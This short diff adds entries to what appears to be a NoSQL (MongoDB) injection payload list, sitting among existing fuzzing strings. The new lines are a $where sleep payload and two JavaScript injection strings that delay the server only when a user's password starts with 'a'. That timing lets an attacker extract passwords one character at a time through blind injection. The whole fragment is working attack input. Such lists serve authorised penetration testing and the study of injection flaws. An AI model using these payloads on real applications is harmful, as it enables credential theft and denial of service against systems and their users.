@@ -11,6 +11,9 @@
 '||1||'
 '%22%60%7b%0d%0a%3b%24Foo%7d%0d%0a%24Foo%20%5cxYZ%00
 '\"`{\r%3b$Foo}\n$Foo+\\xYZ\u0000
+{"$where": "sleep(5000)"}
+admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
 ```
 # Confirming conditional behavior
 ```
